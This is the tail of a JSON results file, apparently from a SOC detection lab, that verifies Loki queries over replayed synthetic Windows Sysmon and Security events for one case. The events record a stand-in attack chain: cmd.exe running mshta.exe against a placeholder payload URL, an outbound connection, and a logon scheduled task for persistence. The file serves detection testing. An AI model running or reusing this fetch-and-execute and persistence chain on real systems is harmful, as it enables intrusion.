    {
      "event_id": 1,
      "query": "{job=\"soclab\",case_id=\"case-005\",replay_run=\"release-v3-verified\",mode=\"replay_now\"} | json | event_id = 1",
      "expected": 3,
      "observed": 3,
      "response": {
        "status": "success",
        "data": {
          "resultType": "streams",
          "result": [
            {
              "stream": {
                "case_id": "case-005",
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "command_line": "cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta",
                "destination_ip": "",
                "event_data_CommandLine": "cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta",
                "event_data_Image": "C:\\Windows\\System32\\cmd.exe",
                "event_data_LogonGuid": "{9e175872-74a3-5c6d-882c-524c742cb7dc}",
                "event_data_LogonId": "0x42",
                "event_data_ParentProcessGuid": "{00000000-0000-0000-0000-000000000000}",
                "event_data_ProcessGuid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
                "event_data_ProcessId": "4000",
                "event_data_User": "LAB\\analyst.lab",
                "event_id": "1",
                "event_uid": "bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6",
                "host": "WS-CHAIN-LAB",
                "image": "C:\\Windows\\System32\\cmd.exe",
                "ip": "",
                "job": "soclab",
                "kind": "synthetic",
                "logon_type": "",
                "mode": "replay_now",
                "original_timestamp": "2026-09-03T10:00:06.000000Z",
                "parent_guid": "{00000000-0000-0000-0000-000000000000}",
                "process_guid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
                "provider": "Microsoft-Windows-Sysmon",
                "record_id": "106",
                "replay_mode": "replay_now",
                "replay_run": "release-v3-verified",
                "script_block": "",
                "service_name": "soclab",
                "source_line": "1",
                "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
                "target_user": "",
                "user": "LAB\\analyst.lab"
              },
              "values": [
                [
                  "1791127034091240400",
                  "{\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"command_line\":\"cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta\",\"destination_ip\":\"\",\"event_data\":{\"CommandLine\":\"cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta\",\"Image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"LogonGuid\":\"{9e175872-74a3-5c6d-882c-524c742cb7dc}\",\"LogonId\":\"0x42\",\"ParentProcessGuid\":\"{00000000-0000-0000-0000-000000000000}\",\"ProcessGuid\":\"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}\",\"ProcessId\":\"4000\",\"User\":\"LAB\\\\analyst.lab\"},\"event_id\":1,\"event_uid\":\"bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-03T10:00:06.000000Z\",\"parent_guid\":\"{00000000-0000-0000-0000-000000000000}\",\"process_guid\":\"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}\",\"provider\":\"Microsoft-Windows-Sysmon\",\"record_id\":106,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":1,\"source_sha256\":\"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d\",\"target_user\":\"\",\"user\":\"LAB\\\\analyst.lab\"}"
                ]
              ]
            },
            {
              "stream": {
                "case_id": "case-005",
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "command_line": "mshta.exe https://payload.example.invalid/stage.hta",
                "destination_ip": "",
                "event_data_CommandLine": "mshta.exe https://payload.example.invalid/stage.hta",
                "event_data_Image": "C:\\Windows\\System32\\mshta.exe",
                "event_data_LogonGuid": "{9e175872-74a3-5c6d-882c-524c742cb7dc}",
                "event_data_LogonId": "0x42",
                "event_data_ParentProcessGuid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
                "event_data_ProcessGuid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
                "event_data_ProcessId": "4001",
                "event_data_User": "LAB\\analyst.lab",
                "event_id": "1",
                "event_uid": "8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c",
                "host": "WS-CHAIN-LAB",
                "image": "C:\\Windows\\System32\\mshta.exe",
                "ip": "",
                "job": "soclab",
                "kind": "synthetic",
                "logon_type": "",
                "mode": "replay_now",
                "original_timestamp": "2026-09-03T10:00:07.000000Z",
                "parent_guid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
                "process_guid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
                "provider": "Microsoft-Windows-Sysmon",
                "record_id": "107",
                "replay_mode": "replay_now",
                "replay_run": "release-v3-verified",
                "script_block": "",
                "service_name": "soclab",
                "source_line": "2",
                "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
                "target_user": "",
                "user": "LAB\\analyst.lab"
              },
              "values": [
                [
                  "1791127034091241400",
                  "{\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"command_line\":\"mshta.exe https://payload.example.invalid/stage.hta\",\"destination_ip\":\"\",\"event_data\":{\"CommandLine\":\"mshta.exe https://payload.example.invalid/stage.hta\",\"Image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"LogonGuid\":\"{9e175872-74a3-5c6d-882c-524c742cb7dc}\",\"LogonId\":\"0x42\",\"ParentProcessGuid\":\"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}\",\"ProcessGuid\":\"{f778258b-2409-596c-9c79-f0ab1770249d}\",\"ProcessId\":\"4001\",\"User\":\"LAB\\\\analyst.lab\"},\"event_id\":1,\"event_uid\":\"8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-03T10:00:07.000000Z\",\"parent_guid\":\"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}\",\"process_guid\":\"{f778258b-2409-596c-9c79-f0ab1770249d}\",\"provider\":\"Microsoft-Windows-Sysmon\",\"record_id\":107,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":2,\"source_sha256\":\"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d\",\"target_user\":\"\",\"user\":\"LAB\\\\analyst.lab\"}"
                ]
              ]
            },
            {
              "stream": {
                "case_id": "case-005",
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "command_line": "schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \"mshta.exe https://payload.example.invalid/stage.hta\"",
                "destination_ip": "",
                "event_data_CommandLine": "schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \"mshta.exe https://payload.example.invalid/stage.hta\"",
                "event_data_Image": "C:\\Windows\\System32\\schtasks.exe",
                "event_data_LogonGuid": "{9e175872-74a3-5c6d-882c-524c742cb7dc}",
                "event_data_LogonId": "0x42",
                "event_data_ParentProcessGuid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
                "event_data_ProcessGuid": "{582945ac-4be3-5081-ab8d-39ed62d01823}",
                "event_data_ProcessId": "4002",
                "event_data_User": "LAB\\analyst.lab",
                "event_id": "1",
                "event_uid": "42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1",
                "host": "WS-CHAIN-LAB",
                "image": "C:\\Windows\\System32\\schtasks.exe",
                "ip": "",
                "job": "soclab",
                "kind": "synthetic",
                "logon_type": "",
                "mode": "replay_now",
                "original_timestamp": "2026-09-03T10:00:09.000000Z",
                "parent_guid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
                "process_guid": "{582945ac-4be3-5081-ab8d-39ed62d01823}",
                "provider": "Microsoft-Windows-Sysmon",
                "record_id": "109",
                "replay_mode": "replay_now",
                "replay_run": "release-v3-verified",
                "script_block": "",
                "service_name": "soclab",
                "source_line": "4",
                "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
                "target_user": "",
                "user": "LAB\\analyst.lab"
              },
              "values": [
                [
                  "1791127034091243400",
                  "{\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"command_line\":\"schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \\\"mshta.exe https://payload.example.invalid/stage.hta\\\"\",\"destination_ip\":\"\",\"event_data\":{\"CommandLine\":\"schtasks.exe /Create /SC ONLOGON /TN LabUpdater /TR \\\"mshta.exe https://payload.example.invalid/stage.hta\\\"\",\"Image\":\"C:\\\\Windows\\\\System32\\\\schtasks.exe\",\"LogonGuid\":\"{9e175872-74a3-5c6d-882c-524c742cb7dc}\",\"LogonId\":\"0x42\",\"ParentProcessGuid\":\"{f778258b-2409-596c-9c79-f0ab1770249d}\",\"ProcessGuid\":\"{582945ac-4be3-5081-ab8d-39ed62d01823}\",\"ProcessId\":\"4002\",\"User\":\"LAB\\\\analyst.lab\"},\"event_id\":1,\"event_uid\":\"42ae87bb3476153ff7f2257ac8949922b6f02b1d20cb7f6b2885ae35c7000fb1\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"C:\\\\Windows\\\\System32\\\\schtasks.exe\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-03T10:00:09.000000Z\",\"parent_guid\":\"{f778258b-2409-596c-9c79-f0ab1770249d}\",\"process_guid\":\"{582945ac-4be3-5081-ab8d-39ed62d01823}\",\"provider\":\"Microsoft-Windows-Sysmon\",\"record_id\":109,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":4,\"source_sha256\":\"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d\",\"target_user\":\"\",\"user\":\"LAB\\\\analyst.lab\"}"
                ]
              ]
            }
          ],
          "stats": {
            "summary": {
              "bytesProcessedPerSecond": 1542289,
              "linesProcessedPerSecond": 1765,
              "totalBytesProcessed": 9608,
              "totalLinesProcessed": 11,
              "execTime": 0.00623,
              "queueTime": 0.000539,
              "subqueries": 0,
              "totalEntriesReturned": 3,
              "splits": 0,
              "shards": 0,
              "totalPostFilterLines": 3,
              "totalStructuredMetadataBytesProcessed": 110
            },
            "querier": {
              "store": {
                "totalChunksRef": 1,
                "totalChunksDownloaded": 1,
                "chunksDownloadTime": 0,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 9608,
                  "decompressedLines": 11,
                  "compressedBytes": 1786,
                  "totalDuplicates": 0,
                  "postFilterLines": 3,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 110
                },
                "chunkRefsFetchTime": 0,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "querierExecTime": 0.002322
            },
            "ingester": {
              "totalReached": 1,
              "totalChunksMatched": 0,
              "totalBatches": 1,
              "totalLinesSent": 0,
              "store": {
                "totalChunksRef": 0,
                "totalChunksDownloaded": 0,
                "chunksDownloadTime": 0,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 0,
                  "decompressedLines": 0,
                  "compressedBytes": 0,
                  "totalDuplicates": 0,
                  "postFilterLines": 0,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 0
                },
                "chunkRefsFetchTime": 0,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "recvWaitTime": 0.000588
            },
            "cache": {
              "chunk": {
                "entriesFound": 1,
                "entriesRequested": 1,
                "entriesStored": 0,
                "bytesReceived": 2186,
                "bytesSent": 0,
                "requests": 2,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "index": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "result": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "statsResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "volumeResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "seriesResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "labelResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "instantMetricResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              }
            },
            "index": {
              "totalChunks": 0,
              "postFilterChunks": 0,
              "shardsDuration": 0,
              "usedBloomFilters": false,
              "totalStreams": 0,
              "chunkRefsLookupTime": 0,
              "bloomFilterTime": 0
            }
          }
        }
      }
    },
    {
      "event_id": 3,
      "query": "{job=\"soclab\",case_id=\"case-005\",replay_run=\"release-v3-verified\",mode=\"replay_now\"} | json | event_id = 3",
      "expected": 1,
      "observed": 1,
      "response": {
        "status": "success",
        "data": {
          "resultType": "streams",
          "result": [
            {
              "stream": {
                "case_id": "case-005",
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "command_line": "",
                "destination_ip": "198.51.100.20",
                "event_data_DestinationIp": "198.51.100.20",
                "event_data_DestinationPort": "443",
                "event_data_Image": "C:\\Windows\\System32\\mshta.exe",
                "event_data_Initiated": "true",
                "event_data_ProcessGuid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
                "event_data_Protocol": "tcp",
                "event_id": "3",
                "event_uid": "bc9eaff475de5e378939be8e751f5fc65e3c9c0fc61030fd810b0edbe9b59ce9",
                "host": "WS-CHAIN-LAB",
                "image": "C:\\Windows\\System32\\mshta.exe",
                "ip": "",
                "job": "soclab",
                "kind": "synthetic",
                "logon_type": "",
                "mode": "replay_now",
                "original_timestamp": "2026-09-03T10:00:08.000000Z",
                "parent_guid": "",
                "process_guid": "{f778258b-2409-596c-9c79-f0ab1770249d}",
                "provider": "Microsoft-Windows-Sysmon",
                "record_id": "108",
                "replay_mode": "replay_now",
                "replay_run": "release-v3-verified",
                "script_block": "",
                "service_name": "soclab",
                "source_line": "3",
                "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
                "target_user": "",
                "user": ""
              },
              "values": [
                [
                  "1791127034091242400",
                  "{\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"command_line\":\"\",\"destination_ip\":\"198.51.100.20\",\"event_data\":{\"DestinationIp\":\"198.51.100.20\",\"DestinationPort\":\"443\",\"Image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"Initiated\":\"true\",\"ProcessGuid\":\"{f778258b-2409-596c-9c79-f0ab1770249d}\",\"Protocol\":\"tcp\"},\"event_id\":3,\"event_uid\":\"bc9eaff475de5e378939be8e751f5fc65e3c9c0fc61030fd810b0edbe9b59ce9\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-03T10:00:08.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"{f778258b-2409-596c-9c79-f0ab1770249d}\",\"provider\":\"Microsoft-Windows-Sysmon\",\"record_id\":108,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":3,\"source_sha256\":\"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d\",\"target_user\":\"\",\"user\":\"\"}"
                ]
              ]
            }
          ],
          "stats": {
            "summary": {
              "bytesProcessedPerSecond": 731664,
              "linesProcessedPerSecond": 837,
              "totalBytesProcessed": 9608,
              "totalLinesProcessed": 11,
              "execTime": 0.013132,
              "queueTime": 0.00058,
              "subqueries": 0,
              "totalEntriesReturned": 1,
              "splits": 0,
              "shards": 0,
              "totalPostFilterLines": 1,
              "totalStructuredMetadataBytesProcessed": 110
            },
            "querier": {
              "store": {
                "totalChunksRef": 1,
                "totalChunksDownloaded": 1,
                "chunksDownloadTime": 1046000,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 9608,
                  "decompressedLines": 11,
                  "compressedBytes": 1786,
                  "totalDuplicates": 0,
                  "postFilterLines": 1,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 110
                },
                "chunkRefsFetchTime": 990000,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "querierExecTime": 0.003279
            },
            "ingester": {
              "totalReached": 1,
              "totalChunksMatched": 0,
              "totalBatches": 1,
              "totalLinesSent": 0,
              "store": {
                "totalChunksRef": 0,
                "totalChunksDownloaded": 0,
                "chunksDownloadTime": 0,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 0,
                  "decompressedLines": 0,
                  "compressedBytes": 0,
                  "totalDuplicates": 0,
                  "postFilterLines": 0,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 0
                },
                "chunkRefsFetchTime": 0,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "recvWaitTime": 0.001243
            },
            "cache": {
              "chunk": {
                "entriesFound": 1,
                "entriesRequested": 1,
                "entriesStored": 0,
                "bytesReceived": 2186,
                "bytesSent": 0,
                "requests": 2,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "index": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "result": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "statsResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "volumeResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "seriesResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "labelResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "instantMetricResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              }
            },
            "index": {
              "totalChunks": 0,
              "postFilterChunks": 0,
              "shardsDuration": 0,
              "usedBloomFilters": false,
              "totalStreams": 0,
              "chunkRefsLookupTime": 0,
              "bloomFilterTime": 0
            }
          }
        }
      }
    },
    {
      "event_id": 4698,
      "query": "{job=\"soclab\",case_id=\"case-005\",replay_run=\"release-v3-verified\",mode=\"replay_now\"} | json | event_id = 4698",
      "expected": 1,
      "observed": 1,
      "response": {
        "status": "success",
        "data": {
          "resultType": "streams",
          "result": [
            {
              "stream": {
                "case_id": "case-005",
                "channel": "Security",
                "command_line": "",
                "destination_ip": "",
                "event_data_SubjectDomainName": "LAB",
                "event_data_SubjectLogonId": "0x42",
                "event_data_SubjectUserName": "analyst.lab",
                "event_data_TaskContent": "<Task><Actions><Exec><Command>mshta.exe</Command></Exec></Actions></Task>",
                "event_data_TaskName": "\\LabUpdater",
                "event_id": "4698",
                "event_uid": "f73d5d23fb0a86f4c55601856cb29ea7a871315700e535e100b6c12b5d087fa5",
                "host": "WS-CHAIN-LAB",
                "image": "",
                "ip": "",
                "job": "soclab",
                "kind": "synthetic",
                "logon_type": "",
                "mode": "replay_now",
                "original_timestamp": "2026-09-03T10:00:10.000000Z",
                "parent_guid": "",
                "process_guid": "",
                "provider": "Microsoft-Windows-Security-Auditing",
                "record_id": "110",
                "replay_mode": "replay_now",
                "replay_run": "release-v3-verified",
                "script_block": "",
                "service_name": "soclab",
                "source_line": "7",
                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
                "target_user": "",
                "user": ""
              },
              "values": [
                [
                  "1791127034091244400",
                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"SubjectDomainName\":\"LAB\",\"SubjectLogonId\":\"0x42\",\"SubjectUserName\":\"analyst.lab\",\"TaskContent\":\"<Task><Actions><Exec><Command>mshta.exe</Command></Exec></Actions></Task>\",\"TaskName\":\"\\\\LabUpdater\"},\"event_id\":4698,\"event_uid\":\"f73d5d23fb0a86f4c55601856cb29ea7a871315700e535e100b6c12b5d087fa5\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-03T10:00:10.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":110,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":7,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"\",\"user\":\"\"}"
                ]
              ]
            }
          ],
          "stats": {
            "summary": {
              "bytesProcessedPerSecond": 2703052,
              "linesProcessedPerSecond": 3094,
              "totalBytesProcessed": 9608,
              "totalLinesProcessed": 11,
              "execTime": 0.003555,
              "queueTime": 0,
              "subqueries": 0,
              "totalEntriesReturned": 1,
              "splits": 0,
              "shards": 0,
              "totalPostFilterLines": 1,
              "totalStructuredMetadataBytesProcessed": 110
            },
            "querier": {
              "store": {
                "totalChunksRef": 1,
                "totalChunksDownloaded": 1,
                "chunksDownloadTime": 0,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 9608,
                  "decompressedLines": 11,
                  "compressedBytes": 1786,
                  "totalDuplicates": 0,
                  "postFilterLines": 1,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 110
                },
                "chunkRefsFetchTime": 0,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "querierExecTime": 0.002019
            },
            "ingester": {
              "totalReached": 1,
              "totalChunksMatched": 0,
              "totalBatches": 1,
              "totalLinesSent": 0,
              "store": {
                "totalChunksRef": 0,
                "totalChunksDownloaded": 0,
                "chunksDownloadTime": 0,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 0,
                  "decompressedLines": 0,
                  "compressedBytes": 0,
                  "totalDuplicates": 0,
                  "postFilterLines": 0,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 0
                },
                "chunkRefsFetchTime": 0,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "recvWaitTime": 0.001
            },
            "cache": {
              "chunk": {
                "entriesFound": 1,
                "entriesRequested": 1,
                "entriesStored": 0,
                "bytesReceived": 2186,
                "bytesSent": 0,
                "requests": 2,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "index": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "result": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "statsResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "volumeResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "seriesResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "labelResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "instantMetricResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              }
            },
            "index": {
              "totalChunks": 0,
              "postFilterChunks": 0,
              "shardsDuration": 0,
              "usedBloomFilters": false,
              "totalStreams": 0,
              "chunkRefsLookupTime": 0,
              "bloomFilterTime": 0
            }
          }
        }
      }
    }
  ],
  "scope": "Executed against localhost Loki. Public samples and synthetic records only. Grafana UI verification is a separate artifact."
}
